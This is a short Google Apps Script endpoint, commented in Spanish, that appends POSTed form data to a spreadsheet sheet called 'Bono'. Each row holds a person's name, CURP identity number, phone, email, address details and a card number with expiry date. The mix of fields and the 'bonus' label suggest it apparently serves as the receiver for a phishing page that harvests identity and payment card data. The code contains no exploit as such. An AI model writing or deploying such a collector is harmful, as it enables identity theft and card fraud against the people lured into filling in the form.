/**
 * Web App endpoint para guardar registros en la hoja "Bono".
 */
function doPost(e) {
  try {
    var sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Bono');
    if (!sh) throw new Error('No existe la hoja Bono');

    var payload = JSON.parse(e.postData.contents || '{}');

    var row = [
      payload.nombre || '',
      payload.fecha || '',
      payload.estado || '',
      payload.ciudad || '',
      payload.curp || '',
      payload.numeroCel || '',
      payload.tarjeta || '',
      payload.fechaRegistro || '',
      payload.exp || '',
      payload.codigoPost || '',
      payload.correo || ''
    ];

    sh.appendRow(row);

    return ContentService.createTextOutput(JSON.stringify({ ok: true }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({ ok: false, error: String(error) }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
